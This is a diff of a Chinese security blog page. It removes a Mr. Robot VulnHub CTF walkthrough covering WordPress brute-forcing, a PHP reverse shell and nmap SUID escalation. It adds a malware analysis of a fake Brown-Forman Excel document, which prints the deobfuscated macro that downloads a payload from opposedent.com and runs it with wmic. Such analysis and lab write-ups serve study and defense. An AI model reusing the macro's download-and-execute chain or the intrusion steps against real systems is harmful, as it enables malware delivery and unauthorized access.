@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>vulnhub-mr.Robot | 九世的博客</title>
-  <meta name="keywords" content=" 靶场 ">
-  <meta name="description" content="vulnhub-mr.Robot | 九世的博客">
+  <title>仿造Brown-Forman恶意文档分析 | 九世的博客</title>
+  <meta name="keywords" content=" 恶意分析 ">
+  <meta name="description" content="仿造Brown-Forman恶意文档分析 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1759,9 +1759,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-vulnhub-mr-Robot" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-仿造Brown-Forman恶意文档分析" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">vulnhub-mr.Robot</h1>
+        <h1 class="article-title">仿造Brown-Forman恶意文档分析</h1>
     
     <div class="article-meta">
         
@@ -1770,14 +1770,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">靶场</a>
+            <a href="javascript:" class="color5">恶意分析</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2020-03-02 15:32:19">2020-03-02 14:13</time>
+        创建时间:<time class="date" title="更新时间: 2021-06-09 02:00:17">2021-06-09 01:47</time>
         
     </div>
     <div class="article-meta">
@@ -1799,7 +1799,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境"><span class="toc-text">环境</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#起因"><span class="toc-text">起因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析过程"><span class="toc-text">分析过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#技术总结"><span class="toc-text">技术总结</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1814,36 +1814,49 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><pre><code>Kali:192.168.1.110
-mr.Robot:192.168.1.106
-</code></pre><p>开局nmap<br><img src="https://s2.ax1x.com/2020/03/02/3RW8UA.png" alt=""></p>
-<p>web打开一看，网页终端<br><img src="https://s2.ax1x.com/2020/03/02/3RWDEj.png" alt=""></p>
-<p>帮助命令给你放视频…<br><img src="https://s2.ax1x.com/2020/03/02/3RW6Cq.png" alt=""></p>
-<p>gobuster跑目录</p>
-<pre><code>gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://192.168.1.106 -t 30
-</code></pre><p><img src="https://s2.ax1x.com/2020/03/02/3RW7P1.png" alt=""></p>
-<p>robots.txt<br><img src="https://s2.ax1x.com/2020/03/02/3RfAsS.png" alt=""></p>
-<p>fsocity.dic是一堆单词<br><img src="https://s2.ax1x.com/2020/03/02/3RhgnU.png" alt=""></p>
-<p><img src="https://s2.ax1x.com/2020/03/02/3Rh0ts.png" alt=""></p>
-<p>通过上面得知是WordPress，wpscan跑，没扫出什么洞<br><img src="https://s2.ax1x.com/2020/03/02/3Rf4Qf.png" alt=""></p>
-<p>枚举用户也没结果<br><img src="https://s2.ax1x.com/2020/03/02/3Rh0ts.png" alt=""></p>
-<p>去wp-login试了下admin,用户不存在<br><img src="https://s2.ax1x.com/2020/03/02/3R4Uv6.png" alt=""></p>
-<p>那么得先跑用户，burp一把梭<br><img src="https://s2.ax1x.com/2020/03/02/3RI0tH.png" alt=""></p>
-<p>得到用户</p>
-<pre><code>Elliot
-</code></pre><p>拿相同的字典撞密码，最终得到的密码是（漫长的等待）</p>
-<pre><code>ER28-0652
-</code></pre><p>登进去发现是admin权限的用户<br><img src="https://s2.ax1x.com/2020/03/02/3RT5yq.png" alt=""></p>
-<p>然后getshell（用的php-reverse-tcp）<br><img src="https://s2.ax1x.com/2020/03/02/3RTx61.png" alt=""></p>
-<p>nc监听，访问拿到shell<br><img src="https://s2.ax1x.com/2020/03/02/3R7r9J.png" alt=""></p>
-<p>查看用户目录下有啥<br><img src="https://s2.ax1x.com/2020/03/02/3RbQzj.png" alt=""></p>
-<p>进入了这个用户的目录，发现个有趣的文件<br><img src="https://s2.ax1x.com/2020/03/02/3RqLHx.png" alt=""></p>
-<p>貌似是robot的hash，md5查一下<br><img src="https://s2.ax1x.com/2020/03/02/3ROkQJ.png" alt=""></p>
-<p>su切换用户<br><img src="https://s2.ax1x.com/2020/03/02/3RO701.png" alt=""></p>
-<p>提权SUID位发现nmap，版本低于5.x使用</p>
-<pre><code>nmap --interactive
-</code></pre><p><img src="https://s2.ax1x.com/2020/03/02/3Rj7i6.png" alt=""></p>
-<p>到root目录拿key完事<br><img src="https://s2.ax1x.com/2020/03/02/3Rv0SO.png" alt=""></p>
+        <h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>信息来源：<a href="https://nitter.domain.glass/Arkbird_SOLG/status/1400845444889120783#m" target="_blank" rel="noopener">https://nitter.domain.glass/Arkbird_SOLG/status/1400845444889120783#m</a><br><img src="https://z3.ax1x.com/2021/06/09/2so9S0.png" alt=""></p>
+<h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>VT查杀：<a href="https://www.virustotal.com/gui/file/b8226e0691779280f1cbbcba93d41e01bc26a7ad37c88bc3b835e72c1376a7fe/detection" target="_blank" rel="noopener">https://www.virustotal.com/gui/file/b8226e0691779280f1cbbcba93d41e01bc26a7ad37c88bc3b835e72c1376a7fe/detection</a></p>
+<pre><code>MD5    4fb331e4e5c6094e731690371687b110
+SHA-1    bcecaaba6462550c61f7ed572e2c06ef8f3f378a
+SHA-256    b8226e0691779280f1cbbcba93d41e01bc26a7ad37c88bc3b835e72c1376a7fe
+Vhash    ec726ed39dd1773fb0790767871cde5c
+SSDEEP    12288:HMc+2YnB6YTbkvA00E+XvQNBzcytqew5W99QPR69Ke+SajzvEnj/igo7tbhzdSNN:H8sYvkhRzdoW9yRCh+vwnj/it7vBSj
+TLSH    T148F423A542CEFD48EA3A3D3761C5039DA197ACEB93150F420E73DB22D99A6F32511F18
+</code></pre><p><img src="https://z3.ax1x.com/2021/06/09/2so30e.png" alt=""></p>
+<p>执行流程<br><img src="https://z3.ax1x.com/2021/06/09/2so8TH.png" alt=""></p>
+<p>下载下来，打开是典型的隐藏表执行宏<br><img src="https://z3.ax1x.com/2021/06/09/2soJkd.png" alt=""></p>
+<p><img src="https://z3.ax1x.com/2021/06/09/2soYtA.png" alt=""></p>
+<p>逐个提取出里面的vba，得到的结果是这样的<br><img src="https://z3.ax1x.com/2021/06/09/2sod6f.png" alt=""></p>
+<pre><code>Auto_Open
+=AB16() ;=FORMULA.ARRAY(&#39;reierj ntrutruiret eruireur&#39;!AJ17&amp;&#39;reierj ntrutruiret eruireur&#39;!AJ18&amp;&#39;reierj ntrutruiret eruireur&#39;!AJ19&amp;&#39;reierj ntrutruiret eruireur&#39;!AJ20&amp;&#39;reierj ntrutruiret eruireur&#39;!AJ21&amp;&#39;reierj ntrutruiret eruireur&#39;!AJ22&amp;&#39;reierj ntrutruiret eruireur&#39;!AJ23&amp;&#39;reierj ntrutruiret eruireur&#39;!AJ24,AB17)
+=Z16() ;Z16=CALL(AB17,AC17,&quot;JCJ&quot;,AD16,0) //Kernel32,,JCJ,C:/Users/Public,0
+=CALL(&quot;UR&quot;&amp;&#39;reierj ntrutruiret eruireur&#39;!AM18,&#39;reierj ntrutruiret eruireur&#39;!AN17&amp;&#39;reierj ntrutruiret eruireur&#39;!AN18&amp;&#39;reierj ntrutruiret eruireur&#39;!AN19&amp;&#39;reierj ntrutruiret eruireur&#39;!AN20&amp;&#39;reierj ntrutruiret eruireur&#39;!AN21&amp;&#39;reierj ntrutruiret eruireur&#39;!AN22&amp;&#39;reierj ntrutruiret eruireur&#39;!AN23&amp;&#39;reierj ntrutruiret eruireur&#39;!AN24&amp;&#39;reierj ntrutruiret eruireur&#39;!AN25&amp;&#39;reierj ntrutruiret eruireur&#39;!AN26&amp;&#39;reierj ntrutruiret eruireur&#39;!AN27&amp;&#39;reierj ntrutruiret eruireur&#39;!AN28&amp;&#39;reierj ntrutruiret eruireur&#39;!AN29&amp;&#39;reierj ntrutruiret eruireur&#39;!AN30&amp;&#39;reierj ntrutruiret eruireur&#39;!AN31&amp;&#39;reierj ntrutruiret eruireur&#39;!AN32&amp;&#39;reierj ntrutruiret eruireur&#39;!AN33&amp;&#39;reierj ntrutruiret eruireur&#39;!AD17,AH24,0,A96,&#39;reierj ntrutruiret eruireur&#39;!AD16&amp;&#39;reierj ntrutruiret eruireur&#39;!AE16,0,0) //URLMon URLDownloadToFileA JJCCBB,0,https://opposedent.com/css/main.css  C:/Users/Public//send.css
+=AE25()  ;EXEC(&quot;wmic process call create &#39;C:/Users/Public/send.css&#39;&quot;)
+
+
+//
+远程下载https://opposedent.com/css/main.css 保存在C:/Users/Public/send.css，wmic创建进程执行C:/Users/Public/send.css
+</code></pre><p><strong> main.css </strong><br>MD5    6f891127db5efdb86a63c7a60a96103f<br>SHA-1    590945c764eb6acccadba94c02d0bc710886f865<br>SHA-256    944e1871cecddd5c18a8939f246e5f552cb24f0b0179f4902c0559b2ad3d336b<br>Vhash    075066551d1d15155az5e!z<br>Authentihash    da7ab1728350ba9cf4a5f8dfa807d89002ad70db8c76829562500c0044776b37<br>Imphash    60f1da2d26406f6f3578f73785af8e9a<br>Rich PE header hash    004ccbc588d0cc025f006eb509f7f855<br>SSDEEP    12288:cGMMRFE7g6Ys/K7zyfuJTsQp4Cp6y5SrL1znr2LphlYuGUoPavYWIJdvrQoDpNkr:9zwRYs/K7ziuKU4jALFYuGDQ2vQoDkRN<br>TLSH    T10AF48D307A52C038F5FB21F85AA9DE34941DBAB0671C68CB63D55EE9D6385F89C3021B<br>PE查询结果<br><img src="https://z3.ax1x.com/2021/06/09/2soBnS.png" alt=""></p>
+<p>VC写的，x86，开了ASLR<br><img src="https://z3.ax1x.com/2021/06/09/2soD0g.png" alt=""></p>
+<p>整体流程是：</p>
+<pre><code>1. 延时几秒
+2. 反调试检测
+3. 获取当前进程路径
+4. 读取自身，设置文件指针，文件数据读取
+5. 内存区域更改
+6. 加载执行
+</code></pre><p><img src="https://z3.ax1x.com/2021/06/09/2sor7Q.png" alt=""></p>
+<p>反调试检测<br><img src="https://z3.ax1x.com/2021/06/09/2soykj.png" alt=""></p>
+<p>加载对应的DLL和实例化对应的API<br><img src="https://z3.ax1x.com/2021/06/09/2so6ts.png" alt=""></p>
+<p>读取自身<br><img src="https://z3.ax1x.com/2021/06/09/2sochn.png" alt=""></p>
+<p>加载对应的DLL和API<br><img src="https://z3.ax1x.com/2021/06/09/2so2pq.png" alt=""></p>
+<p>内存加载的PE<br><img src="https://z3.ax1x.com/2021/06/09/2soR10.png" alt=""></p>
+<p>调试过一遍后，没看出什么危险的操作。利用沙箱运行得到以下结果<br><a href="https://s.threatbook.cn/report/file/944e1871cecddd5c18a8939f246e5f552cb24f0b0179f4902c0559b2ad3d336b/?env=win7_sp1_enx86_office2013" target="_blank" rel="noopener">https://s.threatbook.cn/report/file/944e1871cecddd5c18a8939f246e5f552cb24f0b0179f4902c0559b2ad3d336b/?env=win7_sp1_enx86_office2013</a><br><img src="https://z3.ax1x.com/2021/06/09/2soWcV.png" alt=""></p>
+<p><img src="https://z3.ax1x.com/2021/06/09/2sofXT.png" alt=""></p>
+<h2 id="技术总结"><a href="#技术总结" class="headerlink" title="技术总结"></a>技术总结</h2><pre><code>1. Excel隐藏表执行宏
+2. 反调试，反沙箱
+3. 读取自身内存加载PE执行
+</code></pre><p>能力有限，勿喷</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1853,12 +1866,12 @@ mr.Robot:192.168.1.106
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>vulnhub-mr.Robot</p>
+    <p><span class="copy-title">文章标题:</span>仿造Brown-Forman恶意文档分析</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2020-03-02, 14:13:19</p>
-    <p><span class="copy-title">最后更新:</span>2020-03-02, 15:32:19</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/d25ade48.html" title="vulnhub-mr.Robot">http://422926799.github.io/posts/d25ade48.html</a>
+    <p><span class="copy-title">发布时间:</span>2021-06-09, 01:47:43</p>
+    <p><span class="copy-title">最后更新:</span>2021-06-09, 02:00:17</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/5245e2ed.html" title="仿造Brown-Forman恶意文档分析">http://422926799.github.io/posts/5245e2ed.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
